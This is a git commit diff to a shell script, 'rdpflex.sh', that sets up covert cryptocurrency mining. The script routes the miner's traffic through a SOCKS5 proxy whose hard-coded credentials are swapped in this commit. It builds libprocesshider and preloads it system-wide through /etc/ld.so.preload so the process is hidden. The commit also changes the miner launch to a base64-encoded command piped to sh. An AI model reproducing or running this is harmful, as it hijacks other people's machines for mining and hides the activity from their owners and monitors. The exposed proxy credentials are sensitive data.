09d71d36204aa624dce93f27779e6bbee072e474
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-04-22 02:40:32 +0700

    Update rdpflex.sh

--- rdpflex.sh
+++ rdpflex.sh
@@ -11,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 45.9.154.251:12324
-socks5_username = 14a5029e51675
-socks5_password = 9d332fa7c0
+socks5 =  2.56.120.93:5205
+socks5_username = hadi0139
+socks5_password = buatthr2022
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -44,5 +44,4 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./bezzHash --url=ssl://0xbc48b8bdce572defe4dcab85103f140099bc5af5.RDP@eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+base64 -d <<< Li9ncmFmdGNwL2dyYWZ0Y3AgLi9iZXp6SGFzaCAtLXVybD1zc2w6Ly8weGJjNDhiOGJkY2U1NzJkZWZlNGRjYWI4NTEwM2YxNDAwOTliYzVhZjUuUkRQQGV0aC11cy13ZXN0LmZsZXhwb29sLmlvOjU1NTUgLS1sb2cgLS1leHRyYSAtLWxhdGVuY3kgLS1hbGwtc2hhcmVzIC0tc2hhcmVzLWRldGFpbCAtLXNob3ctbW9kZSAtLWxpc3QtbW9kZXMgLS1tb2RlPTk5 | sh
